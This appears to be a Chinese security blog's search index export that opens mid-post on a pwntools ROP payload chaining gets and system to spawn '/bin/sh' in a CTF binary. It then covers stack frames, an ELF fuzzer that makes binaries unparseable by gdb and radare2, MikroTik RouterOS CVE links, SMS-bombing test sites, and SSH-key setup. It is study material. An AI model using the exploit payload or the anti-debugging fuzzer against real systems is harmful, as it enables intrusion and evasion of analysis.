class="line">自己可构造调用gets把/bin/sh读入到固定地址，再传给system即可</span><br><span class="line">一般来说在程序运行的时候bss段会分配很大一段空间，所以即可随便指定一个位置</span><br><span class="line">但是这里有个问题，我们想的执行了gets函数，再执行system函数，这里的aaaa就是返回地址，怎么执行到system去呢？</span><br><span class="line"></span><br><span class="line">ROP技术：</span><br><span class="line">如果程序中存在pop eax;ret,地址为100，我们用100替换掉aaaa,程序执行完gets之后就回执行pop eax；ret</span><br><span class="line">p.sendline(<span class="string">'a'</span>*112 + p32(elf.plt[<span class="string">'gets'</span>])+<span class="string">'aaaa'</span>+ p32(elf.bss()+0x100)+ <span class="string">'bbbb'</span></span><br><span class="line">就会去执行bbbb</span><br><span class="line">这就是rop技术，而pop eax;ret,这种以ret结尾的代码就被称为gadget，寻找gadget可以用ROPgadget首度寻找，也可使用pwntools提供的模块自动搜索</span><br><span class="line">使用pwntools自动寻找</span><br><span class="line">p.sendline(<span class="string">'a'</span>*112 + p32(elf.plt[<span class="string">'gets'</span>])+p32(rop.search(8).address)+ p32(elf.bss()+0x100)+p32(elf.plt[<span class="string">'system'</span>])+<span class="string">'aaaa'</span>+p32(elf.bss()+0x100))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.intetactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="散散"><a href="#散散" class="headerlink" title="散散"></a>散散</h2><p>程序源代码被编译以后只要分为两种段：程序指令与程序数据，代码段属于程序指令，而数据段和.bss段都属于程序数据<br>.text<br>.data   存放初始化的全局变量与局部静态变量<br>.bss    存放未初始化的全局变量与局部静态变量<br>.rodata 只读数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span> <span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>; <span class="comment">// a function to call</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">demo_stackframe</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">int</span> z;</span><br><span class="line"><span class="comment">//body of function not terribly relevant other than</span></span><br><span class="line">bar(z,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//函数的栈帧（基于EBP的栈帧）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">变量           偏移量</span><br><span class="line"></span><br><span class="line">  z           [ebp-76]</span><br><span class="line">  y            [ebp-72]</span><br><span class="line">buffer         [ebp-68]</span><br><span class="line">  x            [ebp-4]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">save ebp        [ebp]</span><br><span class="line">save eip        [ebp+4]</span><br><span class="line">   a            [ebp+8]</span><br><span class="line">   b            [ebp+12]</span><br><span class="line">   c            [ebp+16]</span><br></pre></td></tr></table></figure><p>//相对于ebp寄存器 //恢复栈帧 “尾声”代码；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     esp, ebp</span><br><span class="line">pop     ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>//由于这项操作十分常见，因此，x86体系结构提供了leave指令，以完成这个任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">define byte      </span><br><span class="line"></span><br><span class="line">db:定义一个存储字节  1字节</span><br><span class="line">dw:定义两个存储字节，也叫做字 2字节</span><br><span class="line">dd:定义4个存储字节，也叫双字 4字节</span><br><span class="line"></span><br><span class="line"> s r </span><br><span class="line"> r:IDA表示被保存的返回地址</span><br><span class="line"> s:被保存的寄存器值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf/pwn/program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn by @LiveOverFlow</title>
      <link href="/2020/03/27/pwn-by-LiveOverFlow/"/>
      <url>/2020/03/27/pwn-by-LiveOverFlow/</url>
      
        <content type="html"><![CDATA[<p>关于<code>@liveoverflow</code>的<code>pwn</code>部分的视频总结，也当作是记录下来，以便翻阅。</p><h2 id="Fuzzing-the-ELF-binary-to-find-parser-differential"><a href="#Fuzzing-the-ELF-binary-to-find-parser-differential" class="headerlink" title="Fuzzing the ELF binary to find parser differential"></a>Fuzzing the ELF binary to find parser differential</h2><h3 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h3><p><code>gdb</code> 与 <code>radare</code>必须解析可执行文件才能进行反汇编与调试，若修改可执行文件，格式被损坏，则该程序则不能运行，且<code>gdb</code>与<code>radare</code>不能进行解析调试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./program</span><br><span class="line">$ radare2 ./program</span><br></pre></td></tr></table></figure><p>那么是否存在能以某种方式修改可执行文件，仍然可以在<code>Linux</code>中执行。即如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./program_1</span><br><span class="line">hacker</span><br><span class="line">$ gdb ./program</span><br><span class="line">ERROR. Can<span class="string">'t read binary</span></span><br><span class="line"><span class="string">$ radare2 ./program</span></span><br><span class="line"><span class="string">Parser Error. Fail...</span></span><br></pre></td></tr></table></figure><h3 id="Parser-Differential-Attack"><a href="#Parser-Differential-Attack" class="headerlink" title="Parser Differential Attack"></a>Parser Differential Attack</h3><p>对于不同的解析器而言，不同的解析器实现的解析算法都有些不同，若将输入搞错了，<code>Linux</code>可能会看到一个有效文件并执行该文件且正常执行，而gdb显示该文件已损坏，下面来看<code>fuzz the ELF binary</code> 的一个<code>Demo</code></p><p><code>license_2.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc==<span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Checking License: %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++) &#123;</span><br><span class="line">sum+= (<span class="keyword">int</span>)argv[<span class="number">1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(sum==<span class="number">916</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Access Granted!\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WRONG!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Usage: &lt;key&gt;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>fuzz the ELF binary</code>来实现上述，当看到<code>fuzz</code>结果中不存在汇编程序时即可。</p><img src="/2020/03/27/pwn-by-LiveOverFlow/a.png" class="" title="This is an example image"><p><code>fuzz.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"cp license_2 license_2_fuzz"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip_byte</span><span class="params">(in_bytes)</span>:</span></span><br><span class="line">i = random.randint(<span class="number">0</span>,len(in_bytes))</span><br><span class="line">c = chr(random.randint(<span class="number">0</span>,<span class="number">0xFF</span>))</span><br><span class="line"><span class="keyword">return</span> in_bytes[:i]+c+in_bytes[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_binary</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"license_2"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> orig_f, open(<span class="string">"license_2_fuzz"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> new_f:</span><br><span class="line">new_f.write(flip_byte(orig_f.read()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span><span class="params">(fn1, fn2)</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(fn1) <span class="keyword">as</span> f1, open(fn2) <span class="keyword">as</span> f2:</span><br><span class="line"><span class="keyword">return</span> f1.read()==f2.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_output</span><span class="params">()</span>:</span></span><br><span class="line">os.system(<span class="string">"(./license_2_fuzz ; ./license_2_fuzz AAAA-Z10N-42-OK) &gt; fuzz_output"</span>)</span><br><span class="line"><span class="keyword">return</span> compare(<span class="string">"orig_output"</span>, <span class="string">"fuzz_output"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_gdb</span><span class="params">()</span>:</span></span><br><span class="line">os.system(<span class="string">"echo disassemble main | gdb license_2_fuzz &gt; fuzz_gdb"</span>)</span><br><span class="line"><span class="keyword">return</span> compare(<span class="string">"orig_gdb"</span>, <span class="string">"fuzz_gdb"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_radare</span><span class="params">()</span>:</span></span><br><span class="line">os.system(<span class="string">'echo -e "aaa\ns sym.main\npdf" | radare2 license_2_fuzz &gt; fuzz_radare'</span>)</span><br><span class="line"><span class="keyword">return</span> compare(<span class="string">"orig_radare"</span>, <span class="string">"fuzz_radare"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">copy_binary()</span><br><span class="line"><span class="keyword">if</span> check_output() <span class="keyword">and</span> <span class="keyword">not</span> check_gdb() <span class="keyword">and</span> <span class="keyword">not</span> check_radare():</span><br><span class="line"><span class="keyword">print</span> <span class="string">"FOUND POSSIBLE FAIL\n\n\n"</span></span><br><span class="line">os.system(<span class="string">"tail fuzz_gdb"</span>)</span><br><span class="line">os.system(<span class="string">"tail fuzz_radare"</span>)</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure><p>最后运行生产的<code>license_2_fuzz</code>，可正常运行，但<code>gdb</code>与<code>radare</code>不能调试。</p><img src="/2020/03/27/pwn-by-LiveOverFlow/b.png" class="" title="This is an example image"><img src="/2020/03/27/pwn-by-LiveOverFlow/c.png" class="" title="This is an example image"><p>参考资料：</p><ol><li><a href="https://www.sentinelone.com/blog/breaking-and-evading" target="_blank" rel="noopener">https://www.sentinelone.com/blog/breaking-and-evading</a></li><li><a href="https://ioactive.com/exploits-curdled-milk-and-nukes-oh-my/" target="_blank" rel="noopener">https://ioactive.com/exploits-curdled-milk-and-nukes-oh-my/</a></li><li><a href="https://openwall.info/wiki/people/solar/pocorgtfo" target="_blank" rel="noopener">International Journal of PoC || GTFO issues</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MikroTik RouterOS漏洞分析相关材料</title>
      <link href="/2020/03/26/MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E6%9D%90%E6%96%99/"/>
      <url>/2020/03/26/MikroTik-RouterOS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E6%9D%90%E6%96%99/</url>
      
        <content type="html"><![CDATA[<h2 id="MikroTik-RouterOS漏洞分析相关材料整理，以便方便查阅"><a href="#MikroTik-RouterOS漏洞分析相关材料整理，以便方便查阅" class="headerlink" title="MikroTik RouterOS漏洞分析相关材料整理，以便方便查阅"></a>MikroTik RouterOS漏洞分析相关材料整理，以便方便查阅</h2><h3 id="漏洞复现环境搭建"><a href="#漏洞复现环境搭建" class="headerlink" title="漏洞复现环境搭建"></a>漏洞复现环境搭建</h3><ol><li><a href="https://4hou.win/wordpress/?p=19279" target="_blank" rel="noopener">https://4hou.win/wordpress/?p=19279</a></li><li><a href="https://xz.aliyun.com/t/1907" target="_blank" rel="noopener">https://xz.aliyun.com/t/1907</a></li><li><a href="https://www.chenghuajie.cn/1351.html" target="_blank" rel="noopener">https://www.chenghuajie.cn/1351.html</a></li><li><a href="https://mikrotik.com/download/archive" target="_blank" rel="noopener">https://mikrotik.com/download/archive</a></li><li><a href="https://blog.csdn.net/qq_41453285/article/details/102152428" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/102152428</a></li><li><a href="https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6" target="_blank" rel="noopener">https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6</a></li><li><a href="https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1" target="_blank" rel="noopener">https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1</a></li></ol><h3 id="漏洞复现细节"><a href="#漏洞复现细节" class="headerlink" title="漏洞复现细节"></a>漏洞复现细节</h3><ol><li>CVE-2018-14847 MikroTik RouterOS Winbox arbitrary file read<ul><li><a href="http://wp.blkstone.me/2019/09/cve-2018-14847-mikrotik-routeros-winbox-arbitrary-file-read/" target="_blank" rel="noopener">http://wp.blkstone.me/2019/09/cve-2018-14847-mikrotik-routeros-winbox-arbitrary-file-read/</a></li><li><a href="https://github.com/BasuCert/WinboxPoC" target="_blank" rel="noopener">https://github.com/BasuCert/WinboxPoC</a></li><li><a href="https://www.anquanke.com/post/id/162457#h3-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162457#h3-10</a></li></ul></li><li>Dissection of winbox Winbox critical vulnerability<ul><li><a href="https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/" target="_blank" rel="noopener">https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/</a></li></ul></li><li>CVE-2018-7445 MikroTik RouterOS SMB 缓冲区溢出<ul><li><a href="https://4hou.win/wordpress/?p=19279" target="_blank" rel="noopener">https://4hou.win/wordpress/?p=19279</a></li></ul></li><li><a href="https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf" target="_blank" rel="noopener">https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf</a></li><li>CVE-2018-1158 MikroTik RouterOS漏洞分析之发现CVE-2019-13955<ul><li><a href="https://www.anquanke.com/post/id/183451" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183451</a></li></ul></li><li>Tenable Research的专家在DerbyCon上发表了题为“Bug Hunting in RouterOS”的演讲，介绍了这项新技术，就是利用该漏洞。目前结合该漏洞的黑客工具已放出，运行RouterOS的MikroTik设备成为恶意代码的目标。<ul><li><a href="https://github.com/tenable/routeros" target="_blank" rel="noopener">https://github.com/tenable/routeros</a></li><li><a href="https://github.com/tenable/routeros/blob/master/slides/bug_hunting_in_routeros_derbycon_2018.pdf" target="_blank" rel="noopener">https://github.com/tenable/routeros/blob/master/slides/bug_hunting_in_routeros_derbycon_2018.pdf</a></li></ul></li><li>通过对比 RouterOS 6.40.7 与 6.40.8 的 npk 文件来逆向工程漏洞细节的过程<ul><li><a href="http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf" target="_blank" rel="noopener">http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf</a></li></ul></li><li>Mikrotik-RouterOS-Resource-Stack-Exhaustion<ul><li><a href="https://packetstormsecurity.com/files/153733/Mikrotik-RouterOS-Resource-Stack-Exhaustion.html" target="_blank" rel="noopener">https://packetstormsecurity.com/files/153733/Mikrotik-RouterOS-Resource-Stack-Exhaustion.html</a></li></ul></li></ol><h3 id="Fuzz-Mikrotik-RouterOS"><a href="#Fuzz-Mikrotik-RouterOS" class="headerlink" title="Fuzz Mikrotik RouterOS"></a>Fuzz Mikrotik RouterOS</h3><ol><li>从0到Reverseshell：Mikrotik SMB漏洞实战（CVE-2018–7445）<ul><li><a href="https://bbs.pediy.com/thread-250733.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250733.htm</a></li></ul></li></ol><h3 id="Mikrotik-RouterOS-安全事件"><a href="#Mikrotik-RouterOS-安全事件" class="headerlink" title="Mikrotik RouterOS 安全事件"></a>Mikrotik RouterOS 安全事件</h3><ol><li>基于 CVE-2018-14847 的 Mikrotik RouterOS 安全事件分析 <ul><li><a href="http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf" target="_blank" rel="noopener">http://ith4cker.com/content/uploadfile/201811/aed91542039274.pdf</a></li></ul></li><li>一些具体攻击案例，值得关注的是该文章中统计攻击者的具体方式<ul><li><a href="https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours/" target="_blank" rel="noopener">https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours/</a></li></ul></li></ol><h3 id="RouterOS-常见操作"><a href="#RouterOS-常见操作" class="headerlink" title="RouterOS 常见操作"></a>RouterOS 常见操作</h3><ol><li><a href="https://www.cnblogs.com/zoulongbin/p/5887746.html" target="_blank" rel="noopener">RouterOS 软路由常用命令</a></li><li><a href="https://blog.csdn.net/zhengfeng2100/article/details/9614515" target="_blank" rel="noopener">RouterOS 命令行操作</a></li></ol><h3 id="MikroTik-版本更新changelogs"><a href="#MikroTik-版本更新changelogs" class="headerlink" title="MikroTik 版本更新changelogs"></a>MikroTik 版本更新changelogs</h3><ol><li><a href="https://mikrotik.com/download/changelogs/long-term-release-tree" target="_blank" rel="noopener">https://mikrotik.com/download/changelogs/long-term-release-tree</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Penetration test Tools</title>
      <link href="/2020/03/26/Penetration-test-Tools/"/>
      <url>/2020/03/26/Penetration-test-Tools/</url>
      
        <content type="html"><![CDATA[<p>记录一些零零散散的小工具和小技巧，后期补充！</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ol><li>Google Hack实用语法</li><li>shodan，fofa搜索</li><li>子域名收集<ul><li>网站的JS文件中，会存在各种对测试有帮助的内容，JSFinder可以帮助我们获取到JS中的url和子域名的信息，拓展我们的渗透范围。爬取分为普通爬取和深度爬取，深度爬取会深入下一层页面爬取JS，时间会消耗的更长<pre><code>JSFinder(https://github.com/Threezh1/JSFinder)</code></pre></li><li>Sublist3r是一个python版工具，其设计原理是基于通过使用搜索引擎，从而对站点子域名进行列举。Sublist3r目前支持以下搜索引擎：Google, Yahoo, Bing, 百度以及Ask，而未来将支持更多的搜索引擎。目前，Sublist3r同样也通过Netcraft以及DNSdumpster获取子域名。<pre><code>Sublist3r(https://github.com/aboul3la/Sublist3r)</code></pre></li><li>云悉(<a href="http://www.yunsee.cn/info.html)云悉可以在线搜集子域名、ip段、CMS指纹等信息" target="_blank" rel="noopener">http://www.yunsee.cn/info.html)云悉可以在线搜集子域名、ip段、CMS指纹等信息</a></li></ul></li><li>github敏感信息泄露实时监控<pre><code>GSIL(GitHub Sensitive Information Leakage)项目，地址：https://github.com/FeeiCN/GSIL,通过配置关键词，实时监控github敏感信息泄露情况，并发送至指定邮箱;</code></pre></li><li>网盘搜索引擎<pre><code>和github类似，网盘中往往会存在企业泄露的内部信息，同样需要关注，常见的网盘搜索引擎：盘多多：http://www.panduoduo.net/盘搜搜：http://www.pansoso.com/盘搜：http://www.pansou.com/凌云风搜索：https://www.lingfengyun.com/</code></pre></li></ol><h3 id="流量抓取"><a href="#流量抓取" class="headerlink" title="流量抓取"></a>流量抓取</h3><p>​        SocksCap64是一款功能非常强大的代理客户端，支持http/https、socks4/5、TCP、UDP等协议，在内网渗透中经常使用，同样可以用他来代理微信PC客户端的流量，并将流量转发至burp中，就可以进行抓包分析。首先还是在burp中设置监听：然后在SocksCap64中设置代理服务器为burp的地址和端口，代理方式HTTP，即可成功抓到微信PC端的流量。</p><h3 id="短信-amp-邮件轰炸绕过"><a href="#短信-amp-邮件轰炸绕过" class="headerlink" title="短信&amp;邮件轰炸绕过"></a>短信&amp;邮件轰炸绕过</h3><p>​        在网站测试的过程中，常常在用户注册登录时出现手机号/邮箱注册，这里就可能出现短信&amp;邮件炸弹漏洞，此类漏洞测试比较方便，虽然有的站点做了防护，但也有一些绕过的办法。这里收集了部分目前较为流行的临时接收短信的网站，方便用于测试：<br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="http://www.z-sms.com/" target="_blank" rel="noopener">http://www.z-sms.com/</a><br><a href="https://www.receive-sms-online.info/" target="_blank" rel="noopener">https://www.receive-sms-online.info/</a><br>[国内] <a href="http://www.smszk.com/" target="_blank" rel="noopener">http://www.smszk.com/</a><br>[国外] <a href="http://receive-sms-online.com/" target="_blank" rel="noopener">http://receive-sms-online.com/</a><br>[国外] <a href="https://smsnumbersonline.com/" target="_blank" rel="noopener">https://smsnumbersonline.com/</a><br>[国外] <a href="https://www.freeonlinephone.org/" target="_blank" rel="noopener">https://www.freeonlinephone.org/</a><br>[国外] <a href="https://sms-online.co/receive-free-sms" target="_blank" rel="noopener">https://sms-online.co/receive-free-sms</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about ssh key</title>
      <link href="/2020/03/26/about-ssh-key/"/>
      <url>/2020/03/26/about-ssh-key/</url>
      
        <content type="html"><![CDATA[<h2 id="添加ssh-key-到Github"><a href="#添加ssh-key-到Github" class="headerlink" title="添加ssh key 到Github"></a>添加ssh key 到Github</h2><p>若未关联<code>Github</code>，则执行<code>hexo deply</code>命令时终端会提示你输入<code>Github</code>的用户名和密码，即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>:</span><br><span class="line">Password <span class="keyword">for</span> <span class="string">'https://xxxxx.github.com'</span>:</span><br></pre></td></tr></table></figure><p>为了避免每次输入<code>Github</code>用户名和密码的麻烦，即可添加<code>ssh key</code> 到<code>GitHub</code></p><h3 id="检查SSH-keys是否存在Github"><a href="#检查SSH-keys是否存在Github" class="headerlink" title="检查SSH keys是否存在Github"></a>检查SSH keys是否存在Github</h3><p>执行如下命令，检查<code>SSH keys</code>是否存在。如果有文件<code>id_rsa.pub</code>或<code>id_dsa.pub</code>，则直接将<code>SSH key</code>添加到<code>Github</code>中，否则进入下一步生成<code>SSH key</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al ~/.ssh</span><br></pre></td></tr></table></figure><h3 id="生成新的ssh-key"><a href="#生成新的ssh-key" class="headerlink" title="生成新的ssh key"></a>生成新的ssh key</h3><p>执行如下命令生成<code>public/private rsa key pair</code>，注意将<code>your_email@example.com</code>换成你自己注册<code>Github</code>的邮箱地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">"your_email@example.com"</span></span><br></pre></td></tr></table></figure><p>默认会在相应路径下（<code>~/.ssh/id_rsa.pub</code>）生成<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件。</p><h3 id="将SSH-key添加到Github"><a href="#将SSH-key添加到Github" class="headerlink" title="将SSH key添加到Github"></a>将SSH key添加到Github</h3><p>Find前往文件夹<code>~/.ssh/id_rsa.pub</code>打开id_rsa.pub文件，里面的信息即为<code>SSH key</code>，将这些信息复制到<code>Github</code>的<code>Add SSH key</code>页面即可。</p><p>进入<code>Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key</code>:</p><p><code>Title</code>里任意添一个标题，将复制的内容粘贴到<code>Key</code>里，点击下方<code>Add key</code>绿色按钮即可。</p><h3 id="关于Themes"><a href="#关于Themes" class="headerlink" title="关于Themes"></a>关于Themes</h3><p><a href="https://hexo.io/themes/" target="_blank" rel="noopener">hexothemes</a> &amp;&amp; <a href="http://jekyllthemes.org/" target="_blank" rel="noopener">Jekyllthemes</a></p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><ol><li><a href="http://gonghonglou.com/2016/02/03/firstblog/" target="_blank" rel="noopener">http://gonghonglou.com/2016/02/03/firstblog/</a></li><li><a href="http://lijiankun24.com/Mac下Hexo和GitHub-Pages搭建个人博客1/" target="_blank" rel="noopener">http://lijiankun24.com/Mac%E4%B8%8BHexo%E5%92%8CGitHub-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A21/</a></li><li><a href="https://www.dazhuanlan.com/2019/09/25/5d8adf4204ed4/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/25/5d8adf4204ed4/</a></li><li><a href="https://www.cnblogs.com/mrwuzs/p/7943337.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrwuzs/p/7943337.html</a></li><li><a href="https://www.cnblogs.com/zhangxiaochn/p/Hexo_Continue.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhangxiaochn/p/Hexo_Continue.html</a></li><li><a href="https://www.jianshu.com/p/beb8d611340a" target="_blank" rel="noopener">https://www.jianshu.com/p/beb8d611340a</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> about blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
